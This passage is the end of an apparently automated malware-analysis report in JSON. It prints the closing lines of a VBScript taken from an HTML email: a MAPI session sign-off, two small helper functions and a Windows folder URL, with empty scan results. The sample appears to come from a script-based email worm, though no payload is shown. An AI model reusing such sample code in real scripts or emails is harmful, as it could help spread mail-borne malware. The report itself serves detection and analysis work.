            "MS.SignOff",
            "End Sub",
            "Function Er()",
            "If Err.Number = 0 Then",
            "Er = False",
            "Else",
            "Err.Clear",
            "Er = True",
            "End If",
            "End Function",
            "Function IsDel(S)",
            "If Mid(S, 4, 1) = 1 Then",
            "IsDel = True",
            "Else",
            "IsDel = False",
            "End If",
            "End Function",
            "</SCRIPT>",
            "</DIV></DIV></BODY></HTML>",
            "</x-html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file://C:\\WINDOWS\\"
        ]
    },
    "time": "0:00:00.304858",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
